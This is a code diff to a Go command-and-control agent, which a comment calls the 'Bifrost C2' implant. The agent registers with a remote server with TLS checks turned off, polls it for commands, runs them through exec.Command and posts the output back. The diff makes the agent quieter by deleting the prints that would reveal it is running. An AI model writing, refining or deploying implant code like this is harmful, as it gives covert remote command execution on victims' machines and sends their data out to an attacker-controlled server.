@@ -60,7 +60,6 @@ func register(serverIP string) string {
 		user.Name,
 		SleepTime,
 	}
-	fmt.Printf("%s", user.Name)
 	postBody, _ := json.Marshal(host_info)
 	responseBody := bytes.NewBuffer(postBody)
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
@@ -87,18 +86,20 @@ func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 	if command == "None" {
 		time.Sleep(sleepTime * time.Second)
 	} else {
-		fmt.Println("Received command")
 		command_id := tokens[1]
 		args := strings.Split(command, " ")
 		parsed_command := args[0]
 		args = args[1:]
 		out, _ := exec.Command(parsed_command, args...).Output()
 		output := string(out[:])
-		resp_body, _ := json.Marshal(map[string]string{
+		resp_body, err := json.Marshal(map[string]string{
 			"agent_id":   agent_id,
 			"command_id": command_id,
 			"output":     output,
 		})
+		if err != nil {
+			fmt.Println("Failed to marshall the json")
+		}
 		responseBody := bytes.NewBuffer(resp_body)
 		http.Post("https://"+serverIP+"/api/1.1/command_out", "application/json", responseBody)
 	}
@@ -108,7 +109,6 @@ func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 // from the Bifrost C2 server.
 func main() {
 	agent_id := register(IP)
-	fmt.Printf("Agent ID: %s\n", agent_id)
 	SleepTime, _ := strconv.Atoi(SleepTime)
 	time_dur := time.Duration(SleepTime)
 	for {
